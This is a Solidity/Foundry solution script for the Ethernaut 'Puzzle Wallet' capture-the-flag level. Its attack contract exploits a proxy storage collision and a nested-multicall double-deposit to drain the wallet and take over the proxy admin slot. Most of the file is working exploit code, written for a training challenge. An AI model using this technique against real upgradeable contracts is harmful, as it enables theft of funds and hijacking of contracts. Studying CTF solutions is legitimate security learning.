// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Math} from "@openzeppelin/utils/math/Math.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";

/**
 *
 * Level address: 0x725595BA16E76ED1F6cC1e1b65A88365cC494824
 * Nowadays, paying for DeFi operations is impossible, fact.
 *
 * A group of friends discovered how to slightly decrease the cost of performing
 * multiple transactions by batching them in one transaction, so they developed
 * a smart contract for doing this.
 *
 * They needed this contract to be upgradeable in case the code contained a bug,
 * and they also wanted to prevent people from outside the group from using it.
 * To do so, they voted and assigned two people with special roles in the
 * system: The admin, which has the power of updating the logic of the smart
 * contract. The owner, which controls the whitelist of addresses allowed to use
 * the contract. The contracts were deployed, and the group was whitelisted.
 * Everyone cheered for their accomplishments against evil miners.
 *
 * Little did they know, their lunch money was at risk…
 *
 *   You'll need to hijack this wallet to become the admin of the proxy.
 *
 *   Things that might help:
 *
 * Understanding how delegatecall works and how msg.sender and msg.value behaves
 * when performing one.
 * Knowing about proxy patterns and the way they handle storage variables.
 *
 */
contract Pawn {
    PuzzleWallet public wallet;
    address me;

    constructor(PuzzleWallet _wallet) {
        wallet = _wallet;
        me = msg.sender;
    }

    function attack() external payable {
        PuzzleProxy(payable(address(wallet))).proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory callData = new bytes[](1);
        callData[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", callData);

        wallet.multicall{value: msg.value}(data);

        wallet.execute(address(this), wallet.balances(address(this)), "");

        wallet.setMaxBalance(uint256(uint160(me)));

        payable(me).transfer(address(this).balance);
    }

    receive() external payable {}

    fallback() external {}
}

contract PuzzleWalletScript is Attacker {
    Level private level = Level(0x725595BA16E76ED1F6cC1e1b65A88365cC494824);

    function run() external {
        vm.startBroadcast(me.privateKey);

        address instance = getNewLevelInstance(level, 0.001 ether);
        PuzzleWallet wallet = PuzzleWallet(instance);

        Pawn pawn = new Pawn(wallet);
        pawn.attack{value: 0.001 ether}();

        require(
            PuzzleProxy(payable(address(wallet))).admin() == me.addr,
            "Not admin"
        );
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
